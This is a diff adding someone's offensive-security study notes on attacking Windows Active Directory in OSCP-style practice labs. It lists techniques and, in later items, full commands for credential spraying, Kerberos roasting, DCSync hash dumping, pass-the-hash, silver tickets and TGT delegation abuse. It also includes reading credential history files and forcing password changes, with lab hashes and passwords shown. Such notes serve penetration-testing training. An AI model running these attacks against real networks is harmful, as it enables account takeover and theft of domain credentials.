@@ -1,0 +1,125 @@
+
+	1. This combination of ports (Kerberos + LDAP + DNS + SMB) suggest that the machine is likely a domain controller.
+	2. If found usernames from the web-page, Use username anarchy tool to create possible combination of the usernames. And use kerbrute tool to brute-force to figure out the valid usernames against the Kerberos Authentication.
+	3. For AS-REP Roasting (TGT) we use impacket-GetNPUsers to check which user's Kerberos pre-authentication is disabled -->  specify hash format - hashcat or john
+	4. Bloodhound DCSync administrator password hashes dump attack using impacket's secretsdump or mimikatz.
+	5. Pass-the-hash of Administrator with evil-winrm gives you Administrator's Account login. Pass-the-hash with psexec gives you the "nt authority\system" account.
+	6. From administrator's account we can use sysinternals PsExec.exe to get a "nt authority\system" shell.
+	7. Always check folder or file permissions using icacls.
+	8. Spray found user credentials on almost each machine. Somewhere we must find a match. (Secura)
+	9. Do not try to run any tools on evil-winrm because it is not that stable. Make use of RDP if available (port 3389). Or just send the cmd.exe on the netcat listener. (Secura PWK)
+	10. Always check GPO with PowerView or bloodhound.
+	11. Even if SMB doesn't say Pwn3d! ,  you must try winrm. I wasted hours and then got to know that could log in through winrm (Pwn3d!), however, SMB did not show Pwn3d!
+	12. If you wanna do more enumeration then sometimes it is better to enumerate on high level shells such as 'nt authority\system' using psexec but it is very slow. OR
+	Just enable the RDP  -->  Paste PsExec.exe  -->  Run it. 
+	13. In AD environment: Use bloodhound on each windows client machines to enumerate more and get an idea. Here, on one machine I found out that the user I am logged in as, is an admin on other machine. Bloodhound  --->   Local Admin Rights  --->   Free Degree Local Admin  (Medtech PWK)
+	14. Always check History files (winpeas shows it). In this case, I found user Damon's credentials in Adrian's history file who was an administrator on the machine. (Relia)
+	15. One thing to remember that while spraying the creds using netexec try both with or without --local-auth tag.
+	Because here I did not get any match until I used --local-auth
+	 --local-auth will force NXC to try local accounts rather than the default domain joined accounts credentials.
+	16. I was trying to get the DC's data from the user who is not a domain user. So make sure, your user is a domain-user.
+	17. Just learned new way to query to DC and fetch the collection of data remotely even if you are not a part of the domain user's account. But if your system is connected to the domain, which means you can still extract the internal information using the system shell. SMB share didn't have read/write permissions so I added read/write perms on smb using registries and modified firewall rules to allow all traffic from SMB 139,445.
+	18. AD:  I checked everything like history files, winpeas output, and all directories except C:\ which was my biggest mistake.
+	So always check C:\ once you get an initial foothold on the system. Because sometimes there might be a folder like "windows.old"
+	19. It took half a minute for SAM and more than 10 minutes for SYSTEM file to get downloaded because that was a very big file but in the end it was worth waiting because didn't face any file corruption errors while downloading. Alternative is netcat which is very fast. Took only 1.5 minute for the SYSTEM file.  (Until here it was OSCP-A)
+	20. AD: Always compare the hashes from the each output we generate whether using mimikatz or secretsdump. Because I found that administrator's hashes were different in mimikatz output and then came to know that one hash was local admin's hash and the second admin was the Administrator on the different machine.
+	21. Note: Always check for Domain and Logon server field (if available) with mimkatz. That's how we differentiate local or domain user/admin.  (Until here it was OSCP-B)
+	22. I tried to run admintool.exe (unknown tool) from winrm but it did not work then I tried to run the same executable binary from the SSH and it gave me some hashes. Cracked online. OR
+	I transferred the admintool.exe on my kali machine, and performed strings with password keyword and got the password.  E.g. --->  strings admintool.exe | grep -i password
+	Lesson learned that do not rely on winrm every time. Always transfer your cmd on the netcat listener from winrm or try different login vectors like SSH if enabled.
+	23. Always check history file of the current user and administrator before and after privesc.
+	--->   cat C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
+	https://michaelkoczwara.medium.com/windows-privilege-escalation-dbb908cce8d4
+	24. Always use --continue-on-success and --local-auth for every login attempt.
+	25. Always make sure to run winpeas and manually check administrator's history even after the compromise.
+	26. If you are on evil-winrm and wget and certutil are not allowed or not working properly, then use its 'Upload and Download' Functionality.
+	27. In the post exploitation, for dumping creds -- use mimikatz and secretsdump, etc. Make sure to use many tools for same thing. We may get different results.
+	28. If you find a password in any file or it contains list of passwords, directly copy it from there and use it because sometimes copying it from another location may not work. (Until here it is OSCP-C)
+	29. If a .pcap or .pcapng file found, in the wireshark search for the POST requests and then Follow TCP streams. May contain login page credentials.
+	30. Even if the netexec says that the user cannot login, just try using winrm once. We may get logged in if lucky and it will be considered as a false-positive from a netexec tool.
+	31. If we have the sharphound data about the subdomain, we need to run sharphound on that domain again to fetch the data from its parent domain.
+	32. If we have the data about subdomain that is running on Bloodhound and if we were able to collect data using sharphound of its parent domain, we don't need to erase its previous connection, instead, we can just add those things together. So, drop your parent domain's sharphound's zip file directly into the running process in bloodhound without clearing the current database.
+	33. Heist PG AD machine --->  
+	SSRF can leak NTLMv2 hashes when a vulnerable Windows server is tricked into making a request to an attacker's SMB/WebDAV listener (e.g., Responder).
+	Windows systems often use NTLM authentication for network-based services like SMB, WebDAV, LDAP, and HTTP. NTLM authentication can be automatic when a Windows machine tries to access a network resource that requires authentication.
+	When a Windows machine attempts to access a UNC path (\\server\share), it may:
+		• Send an authentication request using NTLM if required.
+		• Provide the NTLMv2 hash as part of the authentication handshake.   (Heist PG)
+	34. If the SMB share is open and it has the READ and WRITE permissions then we need to consider a Force Authentication attack --->   https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication
+	35. Even if the SMB says ACCESS_DENIED, you have to look for other things on other ports.
+	Just write  --pass-pol using netexec command to know that it woks.  (Resourced)
+	36. When you have credentials, with smbclient always do like -U domain/username%password on AD.  (Resourced PG)
+	37. Once I had valid creds of domain users and when I ran smbmap using those creds, it showed me "No Access" to any shares. But when I restarted my VPN and machine, It showed "Read/Write" access on 4 shares.
+	38. If you don't have valid creds of a user svc_apache but from bloodhound you found that the other user svc_mssql can be kerberoastable, then in that case we cannot use impacket. Either we can use PowerView or the Rubeus tool locally.
+	39. GMSA Password:
+	There’s a Python tool for extracting GMSA passwords, gMSADumper.
+	--->   python3 gMSADumper.py -u tiffany.molina -p NewIntelligenceCorpUser9876 -l intelligence.htb -d intelligence.htb
+	--->   python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
+	
+	40. Bloodhound AllowedToDelegate:
+	--->   ntpdate 10.10.10.248
+	--->   getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :5e47bac787e5e1970cf9acdb5b316239 -impersonate administrator intelligence.htb/svc_int
+	--->   KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
+	
+	41. It is recommended that if found creds for another user, run Bloodhound-python using new creds too. Because sometimes we can't fetch the all info for every specific user.
+	
+	42. Found usernames? Put that inside a file. Cracked the password? Put that inside a fie. Hashes? Create a different file for it.
+	43. winrm is not allowed? Try different login types from the netexec. Here, FTP worked.
+	44. In order to perform attacks on kerberos authentication remotely (like forcefully changing password for the other user), both machine's clocks needs to be synchronized:
+	--->   apt install ntpdate
+	--->   ntpdate administrator.htb
+	"Run this command at least 2 times I don't know why sometimes does not work at first"  --->  from HTB forum
+	45. For DCSync if winrm is not allowed, use Linux Abuse - Impacket's Secretsdump utility.
+	Here is a deal, referring to bloodhound if windows abuse doesn't work, use Linux Abuse. Simple. Just make sure clock is synchronized.
+	
+	46. Always check each user with mssql even if we can login as winrm because if that user is the database admin and can enable the xp_cmdshell (enable_xp_cmdshell), then we can run command, get a shell and then SeImpersonatePrivilege -->  potato
+	mssql account always have SeImpersonatePrivilege Enabled.
+	
+	47. MSSQLclient  -->  Hokkaido PG   https://medium.com/@sakyb7/proving-grounds-hokkaido-tjnull-oscp-prep-ca34df1e6491
+	
+	48. If there is a Microsoft IIS web server running even if internally (forward it), we can upload .aspx file and execute it to get a shell. Because there is always a SeImpersonatePrivilege enabled for the web server account and we can use Potatoes.
+	49. Always check IPC$  NETLOGON  SYSVOL in SMB  --->  Use DNSpy  -->  Check for creds
+	50. Username Anarchy:
+	--->   ./username-anarchy -i /home/kali/Documents/pg/pg-practice/New/Windows/Nagoya\ -\ AD/usernames -f first,last,firstlast,first.last,last.first,f.last,l.first,flast,lfirst,firstl,lastf > "/home/kali/Documents/pg/pg-practice/New/Windows/Nagoya - AD/users_anarchy"
+	51. Guess the password  -->  if year is 2023 then Summer2023 , Winter2023 , Summer2023! , Winter2023!
+	52. Valid creds? Run bloodhound-python 
+	--->   bloodhound-python -u 'fiona.clark' -p Summer2023 -ns 192.168.162.21 -d nagoya-industries.com -c ALL --dns-tcp --zip
+	53. Run virtual host or sub domain brute forcing.
+	
+	54. Since the sql server is running in the context of the service user, we can impersonate the administrator using silver tickets! 
+	Always try to perform the silver ticket attacks on the service accounts when you have a password. Use impacket-ticketer or other tools via winrm. 
+	
+	--->   ntpdate nagoya-industries.com
+	--->   impacket-ticketer -nthash E3A0168BC21CFB88B95C954A5B18F57C -domain-sid S-1-5-21-1969309164-1513403977-1686805993 -domain nagoya-industries.com -spn MSSQL/nagoya.nagoya-industries.com -user-id 500 Administrator
+	--->   export KRB5CCNAME=Administrator.ccache
+	--->   Add nagoya.nagoya-industries.com for 127.0.0.1 in the /etc/hosts
+	--->   impacket-mssqlclient -k nagoya.nagoya-industries.com
+	
+	55. Valid usernames? Check the information with the rdesktop:  (in the login field, we may find creds)
+	--->   rdesktop -u CHRISTOPHER.LEWIS 192.168.162.21
+	56. Split usernames:   --->   cat valid-users | awk '{split($7, a, "@"); print a[1]}'
+	57. Change user password (bloodhound):
+	--->   net rpc password "BETHAN.WEBSTER" "newP@ssword2022" -U "nagoya-industries.com"/"fiona.clark"%"Summer2023" -S "nagoya-industries.com"
+	58. For DNS -->  dnsenum, dnsrecon, dnsdomainname
+	59. Chisel port forwarding:
+	./chisel client 127.0.0.1:9001 R:8080:127.0.0.1:8080
+	
+	
+	60. iis apppool\defaultapppool   -->  SeImpersonatePrivilege
+	If no SeImpersonatePrivilege?  Use TGT ticket delegation method.
+	This method allows us to get a usable TGT for a current user. And if you get a TGT for the "iis apppool\defaultapppool", you actually get the one from the machine account because this virtual account authenticate over a network as a machine network. And since we get the TGT of the machine account we can use that to do impacket-secretsdump and basically get all the hashes from the system. Pretty cool trick, yeah?
+	--->   c:\temp\Rubeus.exe tgtdeleg /nowrap   --->(Victim's machine)
+	--->   vi base64.kirbi
+	--->   cat base64.kirbi
+	--->   cat base64.kirbi | base64 -d > ticket.kirbi
+	--->   impacket-ticketConverter ticket.kirbi ticket.ccache
+	--->   export KRB5CCNAME=ticket.ccache
+	--->   echo $KRB5CCNAME
+	--->   klist
+	--->   sudo ntpdate hutchdc.hutch.offsec
+	--->   impacket-secretsdump hutch.offsec/HUTCHDC\$@hutchdc.hutch.offsec -dc-ip 192.168.227.122 -no-pass -k
+	
+	
+	
+	
+	
